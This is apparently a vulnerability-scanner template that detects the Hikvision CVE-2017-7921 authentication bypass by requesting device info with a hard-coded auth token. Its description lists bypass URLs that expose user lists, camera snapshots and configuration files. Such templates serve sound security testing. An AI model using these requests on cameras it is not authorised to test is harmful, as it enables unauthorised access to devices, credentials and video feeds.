id: CVE-2017-7921

info:
  name: Hikvision CVE-2017-7921
  author: whwlsfb
  severity: critical
  verified: true
  description: |-
    /Security/users?auth=YWRtaW46MTEK  
    /onvif-http/snapshot?auth=YWRtaW46MTEK
    /System/configurationFile?auth=YWRtaW46MTEK
  reference:
    - https://www.cnblogs.com/charon1937/p/13819804.html
    - https://nvd.nist.gov/vuln/detail/CVE-2017-7921
  tags: hikvision,cve,cve2017,disclosure
  created: 2024/01/06

rules:
  r0:
    request:
      method: GET
      path: /system/deviceInfo?auth=YWRtaW46MTEK
    expression: response.status == 200 && response.headers["content-type"] == "application/xml" && response.body.bcontains(b"<firmwareVersion>")
expression: r0()
